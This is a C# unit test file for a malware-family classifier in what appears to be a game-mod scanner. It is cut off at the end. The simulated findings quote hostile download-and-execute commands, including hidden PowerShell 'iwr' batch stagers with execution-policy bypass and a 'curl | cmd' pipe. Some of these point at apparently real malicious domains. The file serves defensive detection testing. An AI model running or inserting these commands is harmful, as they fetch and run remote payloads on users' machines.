using FluentAssertions;
using MLVScan.Models;
using MLVScan.Models.ThreatIntel;
using MLVScan.Services.ThreatIntel;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Services;

public class ThreatFamilyClassifierTests
{
    [Fact]
    public void Classify_WithExactKnownHash_ReturnsExactHashMatch()
    {
        var classifier = new ThreatFamilyClassifier();

        var findings = new List<ScanFinding>();

        var matches = classifier.Classify(findings, "6c15802426e22e8a0376af1be8bb5caebb5b2e2f4f06a8e7944c80c647a548e6");

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-powershell-iwr-dlbat-v1");
        matches[0].MatchKind.Should().Be(ThreatMatchKind.ExactSampleHash);
        matches[0].ExactHashMatch.Should().BeTrue();
    }

    [Fact]
    public void Classify_WithPowerShellDownloaderBehavior_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Test.Mod.Init:52",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". Arguments: iwr ... dl.bat ... Start-Sleep ... Remove-Item [Evasion: UseShellExecute=true, WindowStyle=Hidden]",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-powershell-iwr-dlbat-v1");
        matches[0].MatchKind.Should().Be(ThreatMatchKind.BehaviorVariant);
        matches[0].MatchedRules.Should().Contain("ProcessStartRule");
        matches[0].Evidence.Should().Contain(e =>
            e.Kind == "rule" &&
            e.RuleId == "ProcessStartRule" &&
            e.Location == "Test.Mod.Init:52");
    }

    [Fact]
    public void Classify_WithExecutionPolicyBypassIwrStartProcessTempBatch_ReturnsPowerShellIwrFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("HutongGames.PlayMaker.ObjectTypeAttribute.Load:59",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". " +
                "Arguments: -ep bypass -c \"iwr 'https://example.invalid/usa/USAMAGA2022.bat' -out $env:TEMP\\dl.bat -useb; " +
                "if (Test-Path $env:TEMP\\dl.bat) { Start-Process -NoNewWindow $env:TEMP\\dl.bat; Start-Sleep -Seconds 120; " +
                "Remove-Item $env:TEMP\\dl.bat -Force }\" [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory=Temp] " +
                "[Staged loader chain (download -> temp drop -> execute)]",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-powershell-iwr-dlbat-v1");
        matches[0].VariantId.Should().Be("powershell-iwr-dlbat-cleanup");
        matches[0].MatchKind.Should().Be(ThreatMatchKind.BehaviorVariant);
        matches[0].ExactHashMatch.Should().BeFalse();
        matches[0].MatchedRules.Should().Contain("ProcessStartRule");
    }

    [Fact]
    public void Classify_WithEmbeddedResourceDataFlowAndShellCallChain_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var callChain = new CallChain(
            "cc-resource-shell32",
            "DllImportRule",
            Severity.Critical,
            "Native shell execution path")
        {
            Nodes =
            {
                new CallChainNode("Malware.Loader.Init", "Entry point calls ExtractPayload", CallChainNodeType.EntryPoint),
                new CallChainNode("Malware.Loader.ExtractPayload", "P/Invoke declaration for shell32.dll ShellExecuteEx", CallChainNodeType.SuspiciousDeclaration)
            }
        };

        var dataFlow = new DataFlowChain(
            "df-resource-shell32",
            DataFlowPattern.EmbeddedResourceDropAndExecute,
            Severity.Critical,
            "Embedded resource extracted to %TEMP%/payload.cmd and executed",
            "Malware.Loader.ExtractPayload")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.ExtractPayload:14", "GetManifestResourceStream", DataFlowNodeType.Source, "embedded resource payload", 14),
                new DataFlowNode("Malware.Loader.ExtractPayload:28", "File.WriteAllBytes", DataFlowNodeType.Sink, "%TEMP%/payload.cmd", 28),
                new DataFlowNode("Malware.Loader.ExtractPayload:41", "PInvoke.ShellExecuteEx", DataFlowNodeType.Sink, "execute temp cmd", 41)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.ExtractPayload", "Native shell execution detected", Severity.Critical)
            {
                RuleId = "DllImportRule",
                CallChain = callChain,
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, new[] { callChain }, new[] { dataFlow }, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-resource-shell32-tempcmd-v2");
        matches[0].MatchedRules.Should().Contain(new[] { "DataFlowAnalysis", "DllImportRule" });
        matches[0].Evidence.Should().Contain(e => e.Kind == "pattern" && e.Value == DataFlowPattern.EmbeddedResourceDropAndExecute.ToString());
        matches[0].Evidence.Should().Contain(e =>
            e.Kind == "call-chain" &&
            e.CallChainId == "cc-resource-shell32");
        matches[0].Evidence.Should().Contain(e =>
            e.Kind == "data-flow-chain" &&
            e.DataFlowChainId == "df-resource-shell32" &&
            e.Pattern == DataFlowPattern.EmbeddedResourceDropAndExecute.ToString());
    }

    [Fact]
    public void Classify_WithEmbeddedUpdaterProcessStartAndNoCmdOrShellExecute_ReturnsNoMatches()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-updater-process-start",
            DataFlowPattern.EmbeddedResourceDropAndExecute,
            Severity.Critical,
            "Extracts embedded updater and starts it from an application data folder",
            "Benign.Updater.Run")
        {
            Nodes =
            {
                new DataFlowNode("Benign.Updater.Run:12", "GetManifestResourceStream", DataFlowNodeType.Source, "embedded updater resource", 12),
                new DataFlowNode("Benign.Updater.Run:24", "File.Create", DataFlowNodeType.Sink, "C:/AppData/Vendor/updater.exe", 24),
                new DataFlowNode("Benign.Updater.Run:36", "Process.Start", DataFlowNodeType.Sink, "run local updater executable", 36)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Benign.Updater.Run", "Embedded updater executable extracted and launched with Process.Start", Severity.Critical)
            {
                RuleId = "DataFlowAnalysis",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().BeEmpty();
    }

    [Fact]
    public void Classify_WithEmbeddedTempCmdAndProcessStart_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-resource-process-start",
            DataFlowPattern.EmbeddedResourceDropAndExecute,
            Severity.Critical,
            "Embedded resource extracted to %TEMP%/payload.cmd and executed with Process.Start",
            "Malware.Loader.Run")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Run:12", "GetManifestResourceStream", DataFlowNodeType.Source, "embedded resource payload", 12),
                new DataFlowNode("Malware.Loader.Run:24", "File.WriteAllBytes", DataFlowNodeType.Sink, "%TEMP%/payload.cmd", 24),
                new DataFlowNode("Malware.Loader.Run:36", "Process.Start", DataFlowNodeType.Sink, "execute temp cmd", 36)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Run", "Embedded resource temp cmd execution chain", Severity.Critical)
            {
                RuleId = "DataFlowAnalysis",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Run:36", "Detected Process.Start call which could execute arbitrary programs. Target: " +
                "\"cmd.exe\". Arguments: /c %TEMP%\\payload.cmd [Evasion: CreateNoWindow=true] [Process with evasion and temp path execution]", Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-resource-shell32-tempcmd-v2");
        matches[0].VariantId.Should().Be("resource-shell32-tempcmd-process-start");
        matches[0].MatchedRules.Should().Contain(new[] { "DataFlowAnalysis", "ProcessStartRule" });
    }

    [Fact]
    public void Classify_WithWebDownloadExecuteDataFlow_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-webclient-stage",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads payload with WebClient and executes it from TEMP",
            "Malware.Loader.Stage")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Stage:12", "DownloadFileTaskAsync", DataFlowNodeType.Source, "remote payload", 12),
                new DataFlowNode("Malware.Loader.Stage:24", "File.WriteAllBytes", DataFlowNodeType.Sink, "%TEMP%/d.bat", 24),
                new DataFlowNode("Malware.Loader.Stage:36", "Process.Start", DataFlowNodeType.Sink, "execute staged payload", 36)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Stage", "Read-only operation downloads executable or script payload from non-allowlisted domain.", Severity.High)
            {
                RuleId = "DataInfiltrationRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage", "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /c %TEMP%\\d.bat [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory=Temp]", Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
        matches[0].VariantId.Should().Be("webdownload-temp-batch-hidden-cmd");
        matches[0].MatchedRules.Should().Contain(new[] { "DataFlowAnalysis", "DataInfiltrationRule", "ProcessStartRule" });
        matches[0].Evidence.Should().Contain(e =>
            e.Kind == "source" &&
            e.DataFlowChainId == "df-webclient-stage" &&
            e.MethodLocation == "Malware.Loader.Stage");
    }

    [Fact]
    public void Classify_WithHttpClientPowerShellStager_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-httpclient-stage",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads a PowerShell script and executes it from TEMP",
            "Malware.Loader.Stage")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Stage:12", "HttpClient.GetByteArrayAsync", DataFlowNodeType.Source, "remote payload", 12),
                new DataFlowNode("Malware.Loader.Stage:24", "File.WriteAllBytes", DataFlowNodeType.Sink, "%TEMP%/d.ps1", 24),
                new DataFlowNode("Malware.Loader.Stage:36", "Process.Start", DataFlowNodeType.Sink, "execute staged PowerShell script", 36)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Stage", "Read-only operation downloads executable or script payload from non-allowlisted domain. URL(s): https://evil.test/da.ps1", Severity.High)
            {
                RuleId = "DataInfiltrationRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage", "Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". Arguments: -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%/d.ps1\" [Evasion: CreateNoWindow=true, UseShellExecute set]", Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
        matches[0].VariantId.Should().Be("webdownload-temp-ps1-hidden-powershell");
        matches[0].Evidence.Should().Contain(e => e.Kind == "source" && e.Value == "HttpClient download");
        matches[0].Evidence.Should().Contain(e => e.Kind == "execution" && e.Value == "hidden powershell.exe script execution");
    }

    [Fact]
    public void Classify_WithResolvedPowerShellFallbackStager_ReturnsPowerShellVariant()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-resolved-powershell-stage",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads a PowerShell script and resolves a launcher before executing it from TEMP",
            "Malware.Loader.Stage")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Stage:12", "DownloadFileTaskAsync", DataFlowNodeType.Source, "remote payload", 12),
                new DataFlowNode("Malware.Loader.Stage:24", "File.WriteAllBytes", DataFlowNodeType.Sink, "%TEMP%/d.ps1", 24),
                new DataFlowNode("Malware.Loader.Stage:36", "Process.Start", DataFlowNodeType.Sink, "resolve powershell path", 36),
                new DataFlowNode("Malware.Loader.Stage:48", "Process.Start", DataFlowNodeType.Sink, "execute staged PowerShell script", 48)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Stage", "Read-only operation downloads executable or script payload from non-allowlisted domain. URL(s): https://evil.test/da.ps1", Severity.High)
            {
                RuleId = "DataInfiltrationRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage:36", "Detected Process.Start call which could execute arbitrary programs. Target: \"where.exe\". Arguments: powershell [Evasion: UseShellExecute set, CreateNoWindow=true] [Controlled child process with redirected I/O]", Severity.Medium)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage:48", "Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". Arguments: -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%/d.ps1\" [Evasion: UseShellExecute set, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory=Temp] [LOLBin with hidden execution (CreateNoWindow, WindowStyle.Hidden, WorkingDirectory=Temp)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (4 operations).", Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage:60", "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /c powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%/d.ps1\" [Evasion: UseShellExecute set, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory=Temp] [LOLBin with hidden execution (CreateNoWindow, WindowStyle.Hidden, WorkingDirectory=Temp)]", Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
        matches[0].VariantId.Should().Be("webdownload-temp-ps1-hidden-powershell");
        matches[0].Evidence.Should().Contain(e => e.Kind == "launcher" && e.Value == "PowerShell path resolution before execution");
    }

    [Fact]
    public void Classify_WithDirectExecutableDropper_ReturnsDirectExecutableVariant()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-direct-exe-stage",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads an executable and launches it from TEMP",
            "Malware.Loader.Stage")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Stage:12", "DownloadFileTaskAsync", DataFlowNodeType.Source, "remote executable payload", 12),
                new DataFlowNode("Malware.Loader.Stage:24", "File.WriteAllBytes", DataFlowNodeType.Sink, "%TEMP%/payload.exe", 24),
                new DataFlowNode("Malware.Loader.Stage:36", "Process.Start", DataFlowNodeType.Sink, "launch staged executable", 36)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Stage", "Read-only operation downloads executable or script payload from non-allowlisted domain. URL(s): https://evil.test/payload.exe", Severity.High)
            {
                RuleId = "DataInfiltrationRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage:36", "Detected Process.Start call which could execute arbitrary programs. Target: \"payload.exe\". Arguments: <unknown/no-arguments> [Evasion: UseShellExecute=true, CreateNoWindow set, WindowStyle set, WorkingDirectory=Temp] [Hidden process execution (UseShellExecute, WorkingDirectory=Temp)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (3 operations).", Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
        matches[0].VariantId.Should().Be("webdownload-temp-exe-direct-launch");
    }

    [Fact]
    public void Classify_WithCorrelatedDirectBatchLaunch_ReturnsWebDownloadGenericVariant()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-direct-batch-stage",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads data from network, processes it, and executes as a program",
            "Malware.Loader.Stage")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Stage:12", "WebClient.DownloadFile", DataFlowNodeType.Source, "remote payload", 12),
                new DataFlowNode("Malware.Loader.Stage:24", "Path.GetTempPath", DataFlowNodeType.Transform, "temporary staging path", 24),
                new DataFlowNode("Malware.Loader.Stage:36", "Process.Start", DataFlowNodeType.Sink, "launch staged batch", 36)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("System.Net.WebClient.DownloadFile:50",
                "Read-only operation to known malicious domain (confirmed payload delivery infrastructure). URL(s): https://fingercakes4sale.store/OIlAL",
                Severity.High)
            {
                RuleId = "DataInfiltrationRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Stage:95",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"t.bat\". Arguments: <unknown/no-arguments> [Evasion: CreateNoWindow=true, WindowStyle=Hidden] [Hidden process execution (CreateNoWindow, WindowStyle.Hidden)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (3 operations).",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
        matches[0].VariantId.Should().Be("webdownload-temp-hidden-launch-generic");
    }

    [Fact]
    public void Classify_WithBase64TempBatchHiddenCmd_ReturnsMetadataLoaderVariant()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Awake:95",
                "Detected FromBase64String call which decodes base64 encrypted strings.",
                Severity.Low)
            {
                RuleId = "Base64Rule"
            },
            new("Malware.Loader.Awake:212",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /C \"%TEMP%/r.bat\" [Evasion: UseShellExecute=true, WindowStyle=Hidden, WorkingDirectory=Temp] [LOLBin with hidden execution (UseShellExecute, WindowStyle.Hidden, WorkingDirectory=Temp)]",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            },
            new("Malware.Loader.Awake",
                "High risk: Multiple suspicious patterns detected (process execution + Base64 decoding + file write)",
                Severity.High)
            {
                RuleId = "MultiSignalDetection"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v2");
        matches[0].VariantId.Should().Be("base64-tempbat-hidden-cmd");
        matches[0].MatchedRules.Should().Contain(new[] { "Base64Rule", "MultiSignalDetection", "ProcessStartRule" });
    }

    [Fact]
    public void Classify_WithEmbeddedResourcePowerShellDownloadTempBatch_ReturnsEmbeddedScriptFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Embedded resource: noclip.KeyBind.Config",
                "Referenced embedded resource 'noclip.KeyBind.Config' contains script execution with staged script payload markers.",
                Severity.High)
            {
                RuleId = "EmbeddedResourceScriptRule",
                CodeSnippet = "@echo off powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://fingercakes4sale.store/bJSVc', \\\"$env:TEMP\\test.bat\\\"); & \\\"$env:TEMP\\test.bat\\\"\""
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-embedded-resource-script-stager-v1");
        matches[0].VariantId.Should().Be("embedded-resource-powershell-download-tempbat");
    }

    [Fact]
    public void Classify_WithCurlPipeToCmd_ReturnsRemoteScriptPipeFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Run:31",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /c curl https://vhs2digitalconvert.co.za/.well-known/acme-challenge/settings.php?win=32 | cmd",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-remote-script-pipe-shell-v1");
        matches[0].VariantId.Should().Be("curl-pipe-cmd-remote-script");
    }

    [Fact]
    public void Classify_WithEncodedPowerShellTempCommandStager_ReturnsEncodedStagerFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("UnityMost.UnityBlind.BuildAssetData:11",
                "Numeric-encoded string with suspicious content detected. Decoded: /c powershell.exe -WindowStyle Hidden -Command \"Invoke-WebRequest -OutFile '%TEMP%\\temp.cmd'; Start-Process -FilePath '%TEMP%\\temp.cmd' -WindowStyle Hidden -Wait\"",
                Severity.High)
            {
                RuleId = "EncodedStringLiteralRule"
            },
            new("UnityMost.UnityMetadata.ProcessGameMetadata",
                "Detected encoded string to char decoding pipeline (Array.ConvertAll<String,Char> -> new String(Char[]))",
                Severity.High)
            {
                RuleId = "EncodedStringPipelineRule"
            },
            new("UnityMost.UnityMetadata/<>c.<ProcessGameMetadata>b__0_0:1",
                "Detected FromBase64String call which decodes base64 encrypted strings.",
                Severity.Low)
            {
                RuleId = "Base64Rule"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-encoded-powershell-tempcmd-stager-v1");
        matches[0].VariantId.Should().Be("numeric-decoded-iwr-tempcmd-hidden-launch");
    }

    [Fact]
    public void Classify_WithAssemblyLoadAndReflectiveInvokeWithoutExecutionEvidence_DoesNotReturnDynamicAssemblyLoaderFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("ClearView.Plugin.LaunchMod:11",
                "Dynamic assembly load detected (Assembly.LoadFrom(string), score 50)",
                Severity.High)
            {
                RuleId = "AssemblyDynamicLoadRule"
            },
            new("ClearView.Plugin.LaunchMod:46",
                "Reflection invocation with non-literal target method name (cannot determine what is being invoked) - combined with other suspicious patterns",
                Severity.High)
            {
                RuleId = "ReflectionRule"
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().NotContain(match => match.FamilyId == "family-dynamic-assembly-reflection-loader-v2",
            "local or unresolved plugin loaders need confirmed execution behavior before becoming a KnownThreat family");
    }

    [Fact]
    public void Classify_WithOpaqueAssemblyLoadReflectiveInvokeAndConfirmedExecution_ReturnsDynamicAssemblyLoaderFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var findings = new List<ScanFinding>
        {
            new("GUI_Tweaks.GUI_Tweaks.LoadMWCGameLogo:11",
                "Dynamic assembly load detected (Assembly.Load(byte[]), score 90): provenance: resource",
                Severity.Critical)
            {
                RuleId = "AssemblyDynamicLoadRule",
                RiskScore = 90,
                BypassCompanionCheck = true
            },
            new("GUI_Tweaks.GUI_Tweaks.LoadMWCGameLogo:46",
                "Reflection invocation with non-literal target method name (cannot determine what is being invoked) - combined with other suspicious patterns",
                Severity.High)
            {
                RuleId = "ReflectionRule"
            },
            new("Embedded resource 'GUI_Tweaks.Resources.image.jpg' -> Image.jpg.GetImage:65",
                "Embedded assembly 'GUI_Tweaks.Resources.image.jpg' finding: Detected Process.Start call which could execute arbitrary programs. Target: \"powershell.exe\". Arguments: -WindowStyle Hidden -Command \"iwr https://example.invalid/payload.bat -out $env:TEMP\\dl.bat\" [Evasion: CreateNoWindow=true]",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                BypassCompanionCheck = true
            }
        };

        var matches = classifier.Classify(findings, null);

        matches.Should().ContainSingle(match =>
            match.FamilyId == "family-dynamic-assembly-reflection-loader-v2" &&
            match.VariantId == "assembly-load-reflective-invoke-confirmed-payload");
    }

    [Fact]
    public void Classify_WithDynamicCodeLoadAndHiddenSvchost_ReturnsDynamicAssemblyLoaderFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-plugin-load",
            DataFlowPattern.DynamicCodeLoading,
            Severity.Critical,
            "Loads and executes code dynamically at runtime",
            "iiMenu.Managers.PluginManager.GetAssembly")
        {
            Nodes =
            {
                new DataFlowNode("iiMenu.Managers.PluginManager.GetAssembly:33", "File.ReadAllBytes", DataFlowNodeType.Source, "file data", 33),
                new DataFlowNode("iiMenu.Managers.PluginManager.GetAssembly:38", "Assembly.Load", DataFlowNodeType.Sink, "dynamic code loaded", 38)
            }
        };
        var findings = new List<ScanFinding>
        {
            new("iiMenu.Managers.PluginManager.GetAssembly:38",
                "Detected dynamic assembly loading with risk indicators.",
                Severity.High)
            {
                RuleId = "AssemblyDynamicLoadRule",
                DataFlowChain = dataFlow
            },
            new("iiMenu.BepinX.CalcOpener/<DownloadAndLaunchAsync>d__1.MoveNext:627",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"svchost.exe\". Arguments: <unknown/no-arguments> [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden] [LOLBin with hidden execution (UseShellExecute, CreateNoWindow, WindowStyle.Hidden)]",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule"
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v2");
        matches.Single(m => m.FamilyId == "family-dynamic-assembly-reflection-loader-v2").VariantId
            .Should().Be("dynamic-code-loader-hidden-system-process");
    }

    [Fact]
    public void Classify_WithCorrelatedDownloadExecuteWithoutDataInfiltrationFinding_ReturnsWebDownloadFamily()
    {
        var classifier = new ThreatFamilyClassifier();
        var dataFlow = new DataFlowChain(
            "df-correlated-download-exec",
            DataFlowPattern.DownloadAndExecute,
            Severity.Critical,
            "Downloads data from network, processes it, and executes as a program",
            "PEAK_CampfireSafeZone.Plugin.Awake")
        {
            Nodes =
            {
                new DataFlowNode("PEAK_CampfireSafeZone.Plugin.Awake:45", "DownloadFile", DataFlowNodeType.Source, "remote payload", 45),
                new DataFlowNode("PEAK_CampfireSafeZone.Plugin.Awake:208", "Process.Start", DataFlowNodeType.Sink, "windows.cmd", 208)
            }
        };
        var findings = new List<ScanFinding>
        {
            new("PEAK_CampfireSafeZone.Plugin.Awake:208",
                "Detected Process.Start call which could execute arbitrary programs. Target: \"cmd.exe\". Arguments: /c \"<dynamic via Path.Combine>/windows.cmd\" [Evasion: UseShellExecute=true, CreateNoWindow=true, WindowStyle=Hidden, WorkingDirectory set] [LOLBin with hidden execution (UseShellExecute, CreateNoWindow, WindowStyle.Hidden)] Correlated data flow: Suspicious data flow: Downloads data from network, processes it, and executes as a program (6 operations).",
                Severity.Critical)
            {
                RuleId = "ProcessStartRule",
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, callChains: null, dataFlows: new[] { dataFlow }, sha256Hash: null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-webdownload-stage-exec-v3");
        matches[0].VariantId.Should().Be("webdownload-temp-hidden-launch-generic");
    }

    [Fact]
    public void Classify_WithMetadataLoaderSignalsAndChains_ReturnsBehaviorMatch()
    {
        var classifier = new ThreatFamilyClassifier();
        var callChain = new CallChain(
            "cc-metadata-loader",
            "ReflectionRule",
            Severity.High,
            "Metadata-backed reflective loader")
        {
            Nodes =
            {
                new CallChainNode("Malware.Loader.Init", "Entry point calls metadata reader", CallChainNodeType.EntryPoint),
                new CallChainNode("Malware.Loader.Metadata", "Reads AssemblyMetadataAttribute values to reconstruct loader strings", CallChainNodeType.SuspiciousDeclaration)
            }
        };

        var dataFlow = new DataFlowChain(
            "df-metadata-loader",
            DataFlowPattern.DynamicCodeLoading,
            Severity.Critical,
            "Decoded metadata-backed payload is loaded dynamically",
            "Malware.Loader.Metadata")
        {
            Nodes =
            {
                new DataFlowNode("Malware.Loader.Metadata:10", "NumericStringDecode", DataFlowNodeType.Transform, "numeric decode pipeline", 10),
                new DataFlowNode("Malware.Loader.Metadata:32", "Assembly.Load", DataFlowNodeType.Sink, "dynamic payload load", 32)
            }
        };

        var findings = new List<ScanFinding>
        {
            new("Malware.Loader.Metadata", "Hidden ProcessStartInfo launcher recovered from numeric strings", Severity.High)
            {
                RuleId = "EncodedStringLiteralRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Metadata", "Numeric string decode pipeline detected", Severity.High)
            {
                RuleId = "EncodedStringPipelineRule",
                DataFlowChain = dataFlow
            },
            new("Malware.Loader.Metadata", "Reflection over AssemblyMetadataAttribute values", Severity.High)
            {
                RuleId = "ReflectionRule",
                CallChain = callChain,
                DataFlowChain = dataFlow
            }
        };

        var matches = classifier.Classify(findings, new[] { callChain }, new[] { dataFlow }, null);

        matches.Should().ContainSingle();
        matches[0].FamilyId.Should().Be("family-obfuscated-metadata-loader-v2");
        matches[0].MatchedRules.Should().Contain(new[]
        {
            "DataFlowAnalysis",
            "EncodedStringLiteralRule",
            "EncodedStringPipelineRule",
            "ReflectionRule"
        });
        matches[0].Evidence.Should().Contain(e =>
            e.Kind == "call-chain" &&
            e.CallChainId == "cc-metadata-loader");
        matches[0].Evidence.Should().Contain(e =>
            e.Kind == "data-flow-pattern" &&
            e.DataFlowChainId == "df-metadata-loader" &&
